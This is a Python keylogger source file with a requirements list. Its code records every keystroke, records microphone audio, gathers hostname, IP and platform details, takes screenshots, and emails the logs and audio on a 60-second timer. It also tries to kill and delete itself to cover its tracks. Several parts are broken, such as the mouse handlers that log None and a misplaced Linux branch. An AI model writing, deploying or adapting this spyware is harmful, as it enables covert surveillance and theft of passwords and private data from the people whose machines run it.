# Keylogger with Email Notifications

# requirements.txt
'''
pynput==1.7.3
pyscreenshot==0.5.1
sounddevice==0.4.3
Pillow==9.3.0

'''

try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot", "sounddevice", "pynput"]
    call("pip install " + ' '.join(modules), shell=True)


finally:
    EMAIL_ADDRESS = "YOUR_USERNAME"
    EMAIL_PASSWORD = "YOUR_PASSWORD"
    SEND_REPORT_EVERY = 60  # as in seconds
    # Disable email notifications if credentials are not set
    email_notifications = not (
        EMAIL_ADDRESS == "YOUR_USERNAME" or EMAIL_PASSWORD == "YOUR_PASSWORD")

    class KeyLogger:
        def __init__(self, time_interval, email, password, email_notifications=True):
            self.interval = time_interval
            self.log = "KeyLogger Started..."
            self.email = email
            self.password = password
            self.email_notifications = email_notifications
            self.ctrl_pressed = False
            self.c_pressed = False
            self.stop_requested = False

        def appendlog(self, string):
            self.log = self.log + string

        def on_move(self, x, y):
            current_move = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_move)

        def on_click(self, x, y):
            current_click = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_click)

        def on_scroll(self, x, y):
            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                current_key = " " + str(key) + " "

            self.appendlog(current_key)

        def send_mail(self, email, password, message, attachment_path=None):
            if not self.email_notifications:
                return  # Do not send email if notifications are disabled
            sender = email
            receiver = email  # send to self (Mailtrap inbox)

            msg = MIMEMultipart()
            msg['From'] = sender
            msg['To'] = receiver
            msg['Subject'] = 'Keylogger Report'
            msg.attach(MIMEText(message, 'plain'))

            # Attach audio file if provided
            if attachment_path and os.path.exists(attachment_path):
                with open(attachment_path, "rb") as f:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename={os.path.basename(attachment_path)}",
                )
                msg.attach(part)

            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(email, password)
                server.sendmail(sender, receiver, msg.as_string())

        def microphone(self):
            fs = 44100
            seconds = self.interval  # Record for the reporting interval
            filename = "audio.wav"
            print("Recording audio...")
            myrecording = sd.rec(
                int(seconds * fs), samplerate=fs, channels=1, dtype='int16')
            sd.wait()
            with wave.open(filename, 'wb') as wf:
                wf.setnchannels(1)
                wf.setsampwidth(2)
                wf.setframerate(fs)
                wf.writeframes(myrecording.tobytes())
            print(f"Audio saved as {filename}")

        def report(self):
            # Save audio from microphone
            self.microphone()
            audio_file = "audio.wav"
            if self.email_notifications:
                self.send_mail(self.email, self.password, "\n\n" +
                               self.log, attachment_path=audio_file)
            else:
                # Save log to a file if email is not set
                with open("entered_keys.txt", "a", encoding="utf-8") as f:
                    f.write(self.log + "\n")
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)

        def screenshot(self):
            img = pyscreenshot.grab()
            self.send_mail(email=EMAIL_ADDRESS,
                           password=EMAIL_PASSWORD, message=img)

        def run(self):
            keyboard_listener = keyboard.Listener(
                on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()
            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

                else:
                    try:
                        pwd = os.path.abspath(os.getcwd())
                        os.system("cd " + pwd)
                        os.system('pkill leafpad')
                        os.system("chattr -i " + os.path.basename(__file__))
                        print('File was closed.')
                        os.system("rm -rf" + os.path.basename(__file__))
                    except OSError:
                        print('File is close.')

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS,
                          EMAIL_PASSWORD, email_notifications=email_notifications)
    keylogger.run()
